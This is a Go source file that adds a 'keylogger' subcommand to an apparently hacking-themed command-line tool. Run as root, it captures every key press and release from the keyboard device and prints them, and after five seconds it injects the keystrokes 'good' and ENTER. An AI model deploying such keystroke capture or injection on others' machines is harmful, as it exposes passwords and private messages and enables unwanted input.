package cmd

import (
	"time"
	"fmt"

	"github.com/spf13/cobra"
	"github.com/MarinX/keylogger"
)

var keyloggerCmd *cobra.Command


func runKeyloggerCmd(cmd *cobra.Command, args []string) error {
	keyboard := keylogger.FindKeyboardDevice()

	if len(keyboard) <= 0 {
		fmt.Print("No keyboard found...\n\n")
		return nil
	}

	fmt.Printf("Found a keyboard at %s\n\n", keyboard)
	k, err := keylogger.New(keyboard)
	if err != nil {
		fmt.Printf("%s\n\n", err)
		return nil
	}
	defer k.Close()

	go func() {
		time.Sleep(5 * time.Second)
		keys := []string{"g", "o", "o", "d", "ENTER"}
		for _, key := range keys {
			k.WriteOnce(key)
		}
	}()

	events := k.Read()

	for e := range events {
		switch e.Type {
		case keylogger.EvKey:

			if e.KeyPress() {
				fmt.Printf("[event] press key %s\n\n", e.KeyString())
			}

			if e.KeyRelease() {
				fmt.Printf("[event] release key %s\n\n", e.KeyString())
			}

			break
		}
	}

	return nil
}

func init() {
	keyloggerCmd = &cobra.Command{
		Use:   "keylogger",
		Short: "Log keystrokes (as root user)",
		RunE:  runKeyloggerCmd,
	}

	hackCmd.AddCommand(keyloggerCmd)
}
